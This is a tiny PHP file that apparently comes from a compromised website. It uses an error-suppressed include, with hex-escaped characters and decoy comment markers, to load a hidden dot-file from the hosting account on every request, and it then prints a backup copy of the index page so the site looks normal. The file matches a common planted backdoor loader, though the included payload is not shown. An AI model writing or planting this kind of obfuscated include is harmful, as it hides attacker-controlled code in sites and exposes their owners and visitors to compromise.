<?php
/*ec22a*/

@include /*g*/("/home/y765zof1uiuf/publi\x63_html/hpwinvipmy.\x63om/ka/.bd90eb\x637.oti");

/*ec22a*/


echo @file_get_contents('index.html.bak.bak');